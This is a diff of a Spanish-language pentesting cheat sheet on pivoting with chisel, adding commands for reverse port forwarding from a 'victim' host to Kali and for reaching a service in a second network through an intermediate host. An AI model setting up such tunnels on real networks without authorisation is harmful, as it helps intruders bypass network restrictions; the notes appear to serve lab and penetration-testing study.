@@ -30,13 +30,14 @@ El pivoting puede ser utilizado para superar restricciones de seguridad que de o
 ```
 
 ## 1. Remote Port Forwarding
+![[ligolo_punto_a_punto_b 2.png]]
 
 ## 1.1 Crear un túnel con un puerto específico 
 
 ```bash
-NOTA: Funciona muy bien para traer servicios en el 'localhost' de la máquina víctima 
+NOTA: Funciona muy bien para traer servicios en el 'localhost' de la máquina víctima (Del punto A a Kali)
 
-❯ ./chisel_linux server --reverse -p 11601       # Crear el server en Kali 
+❯ ./chisel server --reverse -p 11601       # Crear el server en Kali 
 	# Port-Server = Puerto a abrir en Kali
 
 ❯ ./chisel.exe client IP_Kali:11601 R:<Port-Local-a-Abrir>:127.0.0.1:<Port-Traer>    # Levantar el cliente 
@@ -45,13 +46,38 @@ NOTA: Funciona muy bien para traer servicios en el 'localhost' de la máquina v�
 	# Port-Local-a-Abrir = Puerto en Kali donde escuchará 
 	# 127.0.0.1:<Port-Traer> = Destino en la máquina víctima (O sea su puerto a traer: 80,1433, etc...)
 
+
 NOTA: 
 	- Se crea un túnel utilizando un solo puerto con una IP específica
 	- Los comandos ahora serán para la IP '127.0.0.1 o localhost'    <- IMPORTANTE
 ```
 
-## 1.2 Crear un túnel con todos los puertos 
+## 1.2 Traer un puerto específico teniendo un túnel (pivoting) 
 
+```bash 
+NOTA: 
+	- Funciona muy bien para traer servicios en el 'localhost' de la máquina víctima (Del punto B) 
+	- El túnel se crea instalando en el punto A para traer un servicio del punto B (O sea en una segunda red)
+
+
+PUNTO A:
+❯ ./chisel.exe server --reverse -p 9090 --reverse   # Crear el server 
+	# Port-Server = Puerto a abrir en el server 1
+
+PUNTO B:
+❯ ./chisel.exe client IP_PUNTO_A:9090 R:8080:127.0.0.1:8080    # Levantar el cliente 
+
+	# R = Remote Port Forwarding
+	# Port-Local-a-Abrir = Puerto en el PUNTO A donde escuchará 
+	# 127.0.0.1:<Port-Traer> = Destino en la máquina víctima (PUNTO B) (O sea su puerto a traer: 80,1433, etc...)
+
+
+NOTA: 
+	- Se crea un túnel utilizando un solo puerto con una IP específica
+	- Los comandos ahora serán para la IP 'http://IP_PUNTO_A:8080' <- IMPORTANTE
+```
+
+## 1.3 Crear un túnel con todos los puertos 
 ![[ligolo_punto_a_punto_b 2.png]]
 
 ### LLegar de Kali al Punto B por medio del Punto A
